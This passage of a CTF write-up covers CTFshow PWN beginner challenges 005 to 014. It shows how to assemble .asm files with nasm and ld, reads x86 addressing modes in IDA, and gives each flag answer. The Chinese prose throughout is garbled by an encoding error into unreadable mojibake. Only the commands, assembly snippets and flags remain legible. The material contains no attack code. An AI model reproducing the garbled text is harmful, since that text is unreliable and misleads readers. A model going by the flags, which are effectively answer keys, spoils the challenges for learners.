<p>è¿™ä¸ªæ²¡mainå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å›çœ‹é‚£æ®µæ±‡ç¼–è¯­è¨€asmï¼Œè¿™æ®µæ±‡ç¼–è¯­è¨€æ›´åƒæ˜¯åœ¨å¸®åŠ©æˆ‘ä»¬äº†è§£æ±‡ç¼–è¯­è¨€çš„é€»è¾‘è¯­æ³•è§„åˆ™çš„ï¼Œåœ¨<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>æ–‡ç« ä¸­å°±æœ‰è®²è¿‡æ±‡ç¼–è¯­è¨€ï¼Œè¿™é‡Œå°±ç›´æ¥è·³è¿‡è¯¦è§£</p>
<p>è¿™é¢˜å¼€å§‹å°±æœ‰ç‚¹å˜æ ·äº†ï¼Œâ€œWelcome_to_CTFshow.asmâ€è¿™æ–‡ä»¶æ˜¯ä¸€ä¸ªå­˜æ”¾æ±‡ç¼–è¯­è¨€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œéœ€è¦è¿è¡Œä¸€ä¸‹è½¬æ¢æˆåƒexeè¿™æ ·çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨PWN-1è®²è¿‡elfæ–‡ä»¶ï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>å°†æ±‡ç¼–è¯­è¨€ï¼ˆ.asmï¼‰æ–‡ä»¶è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦ç»è¿‡<strong>æ±‡ç¼–ï¼ˆAssembleï¼‰</strong> å’Œ<strong>é“¾æ¥ï¼ˆLinkï¼‰</strong> ä¸¤ä¸ªæ ¸å¿ƒæ­¥éª¤.</p></blockquote></blockquote>
<p>åœ¨Kali/Linuxä¸Šä¸‹è½½nasmç¼–è¾‘å™¨ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nasm
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¸‹è½½ldé“¾æ¥å™¨ï¼ˆé€šå¸¸è‡ªå¸¦ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install binutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
<p>æˆ‘çš„å»ºè®®æ±‡ç¼–è½¬æ¢å’Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹éƒ½åœ¨Kali/Linux/Ubuntuä¸Šï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼Œwindowsä¸‹è½½æ¯”è¾ƒéº»çƒ¦ã€‚</p>
<p>ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹‹åï¼Œç›´æ¥è¿è¡Œå°±èƒ½å¾—åˆ°è¾“å‡ºç»“æœäº†ï¼ŒæŒ‰ç…§é¢˜ç›®è¦æ±‚ï¼ŒåŠ ä¸ª{}åŒ…çš®å»æäº¤å°±å¥½äº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/20.png"
	width="765"
	height="230"
	srcset="/p/ctfshow-pwn-writeup/20_hu_9d3cd65ccf046d84.png 480w, /p/ctfshow-pwn-writeup/20_hu_f0e09656aebee87e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/21.png"
	width="1040"
	height="295"
	srcset="/p/ctfshow-pwn-writeup/21_hu_96a8674a27a83293.png 480w, /p/ctfshow-pwn-writeup/21_hu_adca9e8247769340.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="846px"
	
></p>
<h3 id="pwn_006">PWN_006
</h3><p>é¢˜ç›®ï¼šç«‹å³å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>æŒ‰ç…§PWN-005é‚£æ ·å»è½¬æ¢ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p>
<blockquote>
<p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p></blockquote>
<p><img src="/p/ctfshow-pwn-writeup/22.png"
	width="618"
	height="155"
	srcset="/p/ctfshow-pwn-writeup/22_hu_38c3a83cb1d6b3d2.png 480w, /p/ctfshow-pwn-writeup/22_hu_15cc2bc9e2e15087.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="398"
		data-flex-basis="956px"
	
></p>
<p>Welcome_to_CTFshow_PWN???æ˜¯flagï¼Œé”™äº†ï¼Œé¢˜ç›®æ˜¯<strong>ç«‹å³å¯»å€</strong>æ–¹å¼ç»“æŸå<strong>eaxå¯„å­˜å™¨çš„å€¼</strong>ä¸ºï¼Ÿ</p>
<p>é‚£å°±æ˜¯å¾—æŠŠè¿™ä¸ªè½¬æ¢å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ°IDAä¸Šï¼Œä¸è¿‡ä¹‹å‰è®°å¾—checksecä¸€ä¸‹çœ‹çœ‹æ˜¯x32è¿˜æ˜¯x64ä½å“¦&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç«‹å³å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>        <span class="c1">; å°†11èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>    <span class="c1">; eaxåŠ ä¸Š114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>         <span class="c1">; eaxå‡å»1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/23.png"
	width="1153"
	height="151"
	srcset="/p/ctfshow-pwn-writeup/23_hu_d9da713c30313d8.png 480w, /p/ctfshow-pwn-writeup/23_hu_9162e9b7e00f4ccc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="763"
		data-flex-basis="1832px"
	
></p>
<p>é‚£å°±åŠ å‡æ³•å’¯ï¼š11+114504-1=114514</p>
<p>ctfshow{114514}</p>
<h3 id="pwn_007">PWN_007
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨å¯»å€æ–¹å¼</strong>ç»“æŸå<code>edxå¯„å­˜å™¨</code>çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>æŒ‰ç…§ä¸Šè¿°æ–¹æ³•å»å¾—å‡ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ”¾å…¥IDAï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/24.png"
	width="985"
	height="95"
	srcset="/p/ctfshow-pwn-writeup/24_hu_92bd39fab506337a.png 480w, /p/ctfshow-pwn-writeup/24_hu_75d2f4fa5f54ead5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1036"
		data-flex-basis="2488px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span> <span class="c1">; å°†0x36dèµ‹å€¼ç»™ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span> <span class="c1">; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ctfshow{0x36D}</p>
<h3 id="pwn_008">PWN_008
</h3><p>é¢˜ç›®ï¼šç›´æ¥å¯»å€æ–¹å¼ç»“æŸåecxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç›´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nv">msg</span><span class="p">]</span> <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“ä½ ç¼–è¯‘åå‘ç°æ‰¾ä¸åˆ°åœ°å€[msg]ï¼Œç„¶åæˆ‘ä»¬å€’å›æ¥æ‰¾é¢˜ç›®çš„Welcome_to_CTFshowæ–‡ä»¶ï¼Œç”¨IDAï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/25.png"
	width="721"
	height="25"
	srcset="/p/ctfshow-pwn-writeup/25_hu_5372def4240b6f53.png 480w, /p/ctfshow-pwn-writeup/25_hu_1d2087bdde9824cc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2884"
		data-flex-basis="6921px"
	
></p>
<p>æ•…flag:ctfshow{0x80490E8}</p>
<p>å…¶å®ä¸ç”¨å»è¿›è¡Œç¼–è¯‘çš„ï¼Œåœ¨é¢˜ç›®ç»™çš„æ–‡ä»¶å°±èƒ½åšï¼Œç¼–è¯‘å‡ºæ¥çš„å…¶å®å°±æ˜¯é¢˜ç›®ç»™çš„æ–‡ä»¶ã€‚</p>
<h3 id="pwn_009">PWN_009
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨é—´æ¥å¯»å€</strong>æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/26.png"
	width="650"
	height="175"
	srcset="/p/ctfshow-pwn-writeup/26_hu_db95f2c70775bfb6.png 480w, /p/ctfshow-pwn-writeup/26_hu_6e7577b16306137d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="371"
		data-flex-basis="891px"
	
></p>
<p>ä¸æ˜¯80490E8å“ˆåˆ«è¢«è¯¯å¯¼äº†ï¼Œè¿™æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>å“¦</p>
<p>ç‚¹å‡»è·Ÿè¿›ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/27.png"
	width="659"
	height="25"
	srcset="/p/ctfshow-pwn-writeup/27_hu_2f879014412c83d2.png 480w, /p/ctfshow-pwn-writeup/27_hu_a9abfa63d7183e7a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2636"
		data-flex-basis="6326px"
	
></p>
<p><strong><code>dd 636C6557h</code></strong>ï¼š<code>dd</code> æ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„ä¼ªæ“ä½œç¬¦ï¼Œæ„ä¸º â€œå®šä¹‰åŒå­—ï¼ˆdefine double wordï¼‰â€ï¼Œè¡¨ç¤ºåœ¨å½“å‰åœ°å€å¤„å­˜æ”¾ä¸€ä¸ª 4 å­—èŠ‚çš„æ•°å€¼ã€‚è¿™é‡Œå­˜æ”¾çš„æ•°å€¼æ˜¯ <code>636C6557h</code>ï¼ˆåå…­è¿›åˆ¶ï¼‰ã€‚</p>
<p>flag:ctfshow{0x636C6557}</p>
<h3 id="pwn_010">PWN_010
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨ç›¸å¯¹å¯»å€</strong>æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; å°†ecxåŠ ä¸Š4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/28.png"
	width="845"
	height="154"
	srcset="/p/ctfshow-pwn-writeup/28_hu_e162f950e4f701a0.png 480w, /p/ctfshow-pwn-writeup/28_hu_fc64a86acf95c0c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="548"
		data-flex-basis="1316px"
	
></p>
<p>ç„¶åæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/29.png"
	width="770"
	height="110"
	srcset="/p/ctfshow-pwn-writeup/29_hu_8e18458aaf2629b0.png 480w, /p/ctfshow-pwn-writeup/29_hu_265416ee1eefcac9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="700"
		data-flex-basis="1680px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¿™é‡Œå°†msgçš„åœ°å€ï¼ˆ0x80490E8ï¼‰+ 4 å¤„æ‰€æ‰§å‘çš„åœ°å€çš„å€¼èµ‹ç»™eax</p>
<p>4æ˜¯åè¿›åˆ¶çš„ï¼Œåœ°å€æ˜¯16è¿›åˆ¶çš„ï¼Œè®°å¾—è½¬æ¢ä¸€ä¸‹ï¼š</p>
<p>hex(0x80490E8+4)&ndash;&gt; 080490EC</p>
<p>å¯¹åº”åœ°å€å¾—å€¼æ˜¯ome_to_CTFshow_PWN</p>
<p>æ•…flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_011">PWN_011
</h3><p>é¢˜ç›®ï¼š<strong>åŸºå€å˜å€å¯»å€</strong>æ–¹å¼ç»“æŸåçš„eaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; å°†2èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒæ ·çš„ï¼Œæ”¾åˆ°IDAä¸Šæ‰¾è¿™ä¸ªåŸºå€å˜å€å¯»å€æ–¹å¼ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/30.png"
	width="780"
	height="60"
	srcset="/p/ctfshow-pwn-writeup/30_hu_901c17825a17f8ed.png 480w, /p/ctfshow-pwn-writeup/30_hu_668a6173f2e3ecb2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1300"
		data-flex-basis="3120px"
	
></p>
<p>åŒå‡»ç‚¹dwordå»è·Ÿè¿›åˆ°åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/31.png"
	width="820"
	height="135"
	srcset="/p/ctfshow-pwn-writeup/31_hu_15a7389171b58f28.png 480w, /p/ctfshow-pwn-writeup/31_hu_750b9884b38e7964.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="607"
		data-flex-basis="1457px"
	
></p>
<p>è®¡ç®—æœ€ç»ˆä¹Ÿæ˜¯ [0x80490E8 + 2*2 ] = [0X80490EC]</p>
<p>å…¶å®ä¹Ÿæ˜¯å’ŒPWN_010ä¸€æ ·ï¼šhex(0x80490E8+4)</p>
<p>å°±æ˜¯è¯´hex(0x80490E8 + 2*2 )=0X80490ECï¼Œå¯¹åº”çš„æ˜¯â€œome_to_CTFshow_PWNâ€ã€‚</p>
<p>flagï¼šctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_012">PWN_012
</h3><p>é¢˜ç›®ï¼šç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; å°†1èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; å°†ecxåŠ ä¸Š8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/32.png"
	width="770"
	height="164"
	srcset="/p/ctfshow-pwn-writeup/32_hu_99e9e101810244d0.png 480w, /p/ctfshow-pwn-writeup/32_hu_f807a9c980e1f370.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1126px"
	
></p>
<p>è·Ÿè¿›offset dword_80490E8ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/33.png"
	width="856"
	height="105"
	srcset="/p/ctfshow-pwn-writeup/33_hu_3157e877f3a9f1c1.png 480w, /p/ctfshow-pwn-writeup/33_hu_77b09f0915eccfa5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="815"
		data-flex-basis="1956px"
	
></p>
<p>é‚£å°±æ˜¯ï¼š[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]</p>
<p>æ•…flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_013">PWN_013
</h3><p>é¢˜ç›®ï¼šå¦‚ä½•ä½¿ç”¨GCCï¼Ÿç¼–è¯‘è¿è¡Œåå³å¯è·å¾—flag  <a class="link" href="PWN_013%5cPWN_013.c" >PWN_013.c</a></p>
<p>å­¦è¿‡Cè¯­è¨€éƒ½ä¼šå®‰è£…é…ç½®ç¼–è¯‘å™¨ç¯å¢ƒçš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<strong>visual-studio-code</strong>ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/34.png"
	width="1534"
	height="466"
	srcset="/p/ctfshow-pwn-writeup/34_hu_a2d59cd0ef0b2014.png 480w, /p/ctfshow-pwn-writeup/34_hu_a654e108c81c213e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="329"
		data-flex-basis="790px"
	
></p>
<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ C ç¨‹åºï¼Œå®ƒä½¿ç”¨å­—ç¬¦æ•°ç»„ flag å­˜å‚¨äº†ä¸€ä¸ªåŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œå¹¶é€šè¿‡ printfå‡½æ•°å°†å…¶æ‰“å°å‡ºæ¥ã€‚</p>
<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ flag æ•°ç»„å­˜å‚¨äº†ä¸€ä¸²æ•´æ•°å€¼ï¼Œè¿™äº›æ•´æ•°å€¼ä»£è¡¨äº†å­—ç¬¦çš„ ASCII ç ã€‚é€šè¿‡å°†è¿™äº›æ•´æ•°å€¼è½¬æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œå°±å¯ä»¥è¿˜åŸå‡ºåŸå§‹çš„å­—ç¬¦ä¸²ã€‚</p>
<p>è¿è¡Œè¯¥ç¨‹åºï¼Œ printf å‡½æ•°ä½¿ç”¨ %s æ ¼å¼å­—ç¬¦ä¸²å°† flag æ•°ç»„ä½œä¸ºå‚æ•°è¿›è¡Œæ‰“å°ã€‚ç”±äº flag æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ä¸ºé›¶ï¼ˆNULL å­—ç¬¦ï¼‰ï¼Œ printf å‡½æ•°ä¼šå°†å…¶ä¹‹å‰çš„å­—ç¬¦ä¾æ¬¡æ‰“å°ï¼Œç›´åˆ°é‡åˆ° NULL å­—ç¬¦ä¸ºæ­¢ã€‚æ ¹æ®ç»™å®šçš„æ•´æ•°å€¼æ•°ç»„ï¼Œè¿˜åŸå‡ºçš„å­—ç¬¦ä¸²ä¸ºï¼š ctfshow{hOw_t0_us3_GCC?} ã€‚</p>
<h3 id="pwn_014">PWN_014
</h3><p>é¢˜ç›®ï¼šè¯·ä½ é˜…è¯»ä»¥ä¸‹æºç ï¼Œ<strong>ç»™å®škeyä¸ºâ€CTFshowâ€</strong>ï¼Œç¼–è¯‘è¿è¡Œå³å¯è·å¾—flagã€‚ <a class="link" href="PWN_014%5cPWN_014.c" >PWN_014.c</a></p>
